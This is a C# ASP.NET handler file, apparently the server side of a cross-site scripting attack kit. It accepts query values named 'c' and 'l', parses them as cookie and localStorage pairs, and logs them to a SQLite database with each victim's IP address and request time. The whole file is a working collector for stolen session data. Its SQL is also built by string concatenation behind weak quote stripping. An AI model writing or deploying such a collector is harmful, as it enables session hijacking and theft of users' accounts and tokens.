<%@ WebHandler Language="C#" Class="handle" %>

using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Data.SQLite;

public class handle : IHttpHandler {

    public void ProcessRequest(HttpContext context)
    {
        UserInfo userInfo = new UserInfo();
        userInfo.Ip = context.Request.UserHostAddress;
        userInfo.UserHostName = context.Request.UserHostName;
        userInfo.RequestTime = DateTime.Now;


        //get requestCookie
        userInfo.Cookies = GetParams(context.Request["c"]);

        //get localStrong
        userInfo.Localstrongs = GetParams(context.Request["l"]);

        context.Response.ContentType = "text/plain";
        //context.Response.Write("cookies length:" + userInfo.Cooies.Count());

        context.Response.Write("Result:" + AddToDataBase(userInfo, context) + "\n");


    }

    public int AddToDataBase(UserInfo userInfo, HttpContext context)
    {
        int lastId = 0;
        int cookiesCount = userInfo.Cookies.Count();
        int localstrongCount = userInfo.Localstrongs.Count();

        if (cookiesCount > 0 || localstrongCount > 0)
        {
            SQLiteDatabase db = new SQLiteDatabase();
            string sql = @"insert into userInfo(ip,userhostname,requesttime,cookiscount,localstrongcount) values(@ip,@userhostname,@requesttime,@cookiscount,@localstrongcount);select last_insert_rowid();";

            Dictionary<string, object> paramters = new Dictionary<string, object>();
            paramters.Add("ip", userInfo.Ip);
            paramters.Add("userhostname", userInfo.UserHostName);
            paramters.Add("requesttime", userInfo.RequestTime.ToString("yyyy-MM-dd HH:mm:ss"));
            paramters.Add("cookiscount", cookiesCount);
            paramters.Add("localstrongcount", localstrongCount);

            int.TryParse(db.ExecuteScalar(sql, paramters), out lastId);


            if (cookiesCount > 0 && lastId > 0)
            {
                sql = "";
                foreach (var item in userInfo.Cookies)
                {
                    var key = HttpUtility.HtmlEncode(item.Key.Replace("'", ""));
                    var value = HttpUtility.HtmlEncode(item.Value.Replace("'", ""));
                    sql += "insert into usercookie(infoId,infoKey,infoValue) values(" + lastId + ",'" + key + "','" + value + "');";
                }
                context.Response.Write("Relation cookies line:" + db.ExecuteNonQuery(sql));
            }

            if (localstrongCount > 0 && lastId > 0)
            {
                sql = "";
                foreach (var item in userInfo.Localstrongs)
                {
                    var key = HttpUtility.HtmlEncode(item.Key.Replace("'", ""));
                    var value = HttpUtility.HtmlEncode(item.Value.Replace("'", ""));
                    sql += "insert into userlocalstrong(infoId,infoKey,infoValue) values(" + lastId + ",'" + key + "','" + value + "');";
                }
                context.Response.Write("Relation localstrongs line:" + db.ExecuteNonQuery(sql));
            }

        }

        return lastId;
    }

    public Dictionary<string, string> GetParams(string p)
    {
        var items = new Dictionary<string, string>();

        if (p != null)
        {
            string str_cookies = p;

            foreach (string str_cookie in str_cookies.Split(';'))
            {
                var c = str_cookie.Split('=');
                if (c.Length < 2) continue;
                string key = c[0];
                string content = c[1];
                if (!items.ContainsKey(key))
                    items.Add(key, content);
            }
        }

        return items;
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }

}